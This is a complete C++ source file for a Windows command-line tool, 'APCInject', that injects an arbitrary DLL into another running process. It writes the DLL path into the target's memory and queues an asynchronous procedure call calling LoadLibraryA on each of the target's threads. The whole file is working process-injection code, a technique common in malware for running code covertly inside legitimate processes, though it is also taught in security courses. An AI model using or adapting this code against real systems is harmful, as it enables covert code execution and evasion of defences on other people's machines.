#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <vector>

using namespace std;

int err(const char* msg) {
    printf("%s (%u)", msg, GetLastError());
    return 1;
}

vector<DWORD> GetProcessThreads(DWORD pid) {
    vector<DWORD> tids;

    auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return tids;

    THREADENTRY32 te = { sizeof(te) };
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tids.push_back(te.th32ThreadID);
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return tids;
}

int main(int argc, const char* argv[]) {
    if (argc < 3) {
        printf("Usage: APCInject <pid> <dllpath>\n");
        return 0;
    }

    int pid = atoi(argv[1]);

    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, pid);
    if (!hProcess)
        return err("Error OpenProcess");

    void* buf = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf)
        return err("Error VirtualAllocEx");

    if (!WriteProcessMemory(hProcess, buf, argv[2], strlen(argv[2]), nullptr))
        return err("Error WriteProcessMemory");

    auto tids = GetProcessThreads(pid);
    if (tids.empty()) {
        printf("Failed to locate threads in process %u\n", pid);
        return 1;
    }

    for (const DWORD tid : tids) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
        if (hThread) {
            QueueUserAPC((PAPCFUNC)GetProcAddress(::GetModuleHandle(L"kernel32"), "LoadLibraryA"),
                hThread, (ULONG_PTR)buf);
            CloseHandle(hThread);
        }
    }
    
    printf("APC sent!\n");
    CloseHandle(hProcess);

    return 0;
}

